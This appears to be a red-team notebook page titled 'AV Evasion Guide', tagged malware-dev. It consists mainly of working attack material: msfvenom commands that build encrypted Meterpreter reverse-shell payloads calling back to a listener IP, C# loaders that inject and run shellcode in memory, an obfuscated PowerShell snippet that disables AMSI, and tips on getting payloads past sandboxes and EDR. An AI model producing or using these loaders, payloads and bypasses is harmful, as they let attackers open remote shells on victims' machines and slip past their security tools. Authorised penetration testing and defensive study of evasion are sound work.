---
tags:
  - redteam
  - av-evasion
  - edr
  - malware-dev
created: 2026-08-29
status: complete
---

# 🛡️ AV Evasion Guide

> [!abstract] TL;DR
> Static signatures catch known bytes; heuristics catch known behavior.
> Evasion = custom loader + in-memory execution + no stock msfvenom output.

---

## 1. How Detection Actually Works

| Layer | What it checks | Bypass |
|---|---|---|
| Static signatures | Known byte sequences, hashes, yara rules | Encryption, polymorphism, custom code |
| Heuristics/emulation | Emulates execution, flags decoder loops, API patterns | Opaque predicates, indirect syscalls |
| Behavioral | Process injection, RWX memory, LSASS access | Syscall proxies, callback-based execution |
| AMSI (Windows) | Scans scripts (PS/VBA/JScript) in memory | Patching, obfuscation, downgrades |
| ETW | Telemetry feed for EDRs | ETW patching, tampering |
| EDTR | Kernel callbacks/minifilters | BYOVD, unhooking (limited) |

> [!warning] Why `-e shikata_ga_nai -i 10` fails in 2026
> Decoder stubs are signatured AND emulated. The emulator runs the decode loop,
> catches the resulting shellcode, flags it. Iterations only add entropy noise.

---

## 2. Shellcode-First Workflow

```bash
# 1) Raw stageless shellcode — never drop a stock .exe
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=10.10.14.5 LPORT=443 -f raw -o shell.bin

# 2) Encrypt it (or encrypt inside your loader)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=10.10.14.5 LPORT=443 \
  --encrypt aes256 --encrypt-key $(openssl rand -hex 32) \
  --encrypt-iv $(openssl rand -hex 16) -f csharp -o shell.cs
```

---

## 3. Loader Techniques (Ranked by OpSec Cost)

### 3.1 Basic — self-injected RWX (works vs Defender only)
```csharp
// C# — VirtualAlloc + Marshal.Copy + CreateThread
byte[] buf = DecryptAESEmbedded();          // decrypt at runtime
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
Marshal.Copy(buf, 0, mem, buf.Length);
IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
```

### 3.2 Better — callback-based execution (no CreateThread)
```csharp
// EnumSystemLocalesA / EnumFonts / CertEnumSystemStore etc.
// Executes shellcode via legitimate API callback — fewer heuristic hits
EnumSystemLocalesA((Delegate)Marshal.GetDelegateForFunctionPointer(mem, typeof(LocEnumProc)), 0);
```

### 3.3 Better still — remote injection into a sacrificial process
```csharp
// spawn notepad.exe (suspended) → VirtualAllocEx → WriteProcessMemory → resume
// PPID spoofing to look like a child of a legit process
```

### 3.4 Best (lab-grade) — direct syscalls / D/Invoke
```text
- Direct syscalls: ntdll stubs reimplemented, bypass ntdll.dll hooks
- D/Invoke: manual syscall number lookup, map a fresh ntdll from disk
- Tools: SysWhispers3, SharpHound-style DInvoke projects, HellsGate/HalosGate
```

---

## 4. AMSI Bypass

```powershell
# Classic patch — flag as known, but works after obfuscation
$a=[Ref].Assembly.GetType('Sys'+'tem.Mana'+'gement.Automation.'+'Am'+'siUt'+'ils')
$b=$a.GetField('am'+'siIni'+'t','NonPublic,Static')
$b.SetValue($null,$true)
```

> [!tip] Practical AMSI notes
> - String-split + format-string + base64 layering defeats basic signature matching
> - .NET 4.8+ and PowerShell 7 hardened AMSI — test on target version
> - Alternative: don't run PS at all — C# assemblies in-memory (`Assembly.Load`)

---

## 5. Encryption Formats

```bash
# RC4
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 \
  --encrypt rc4 --encrypt-key 5e8f9a... -f python

# XOR
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 \
  --encrypt xor --encrypt-key deadbeef -f c
```

---

## 6. Delivery Hardening

- Serve over HTTPS with a legit-looking cert; use domain fronting/CDN where legal in scope
- `reverse_https` with `StagerVerifySSLCert` in the handler
- Staged payloads: stage travels plaintext by default → prefer stageless or `EnableStageEncoding`
- Time-based execution delays + machine-key triggers (keyboard/mouse) vs sandbox detonation
- Split payload across resources: shellcode in a "config file", loader fetches at runtime (stagerless web delivery)

---

## 7. Testing Loop

```bash
# Local static check before deployment
./defender-check shell.exe      # static scan emulation
threatcheck -e shell.exe        # EICAR-style diffing against Defender sigs
```

> [!summary] Golden rules
> 1. Never ship stock msfvenom binaries — generate raw shellcode only
> 2. Loader code is yours, unique, and per-engagement (never reuse public loaders verbatim)
> 3. In-memory > on-disk; sacrificial process > self-injection
> 4. Test on a live VM with the target's actual AV/EDR stack, updated
> 5. If blocked, diff what changed — don't blindly add obfuscation layers

Related: [[msfvenom — Payload Generation Guide]] · [[Shellcode Injection]] · [[Meterpreter]] · [[Metasploit Framework]]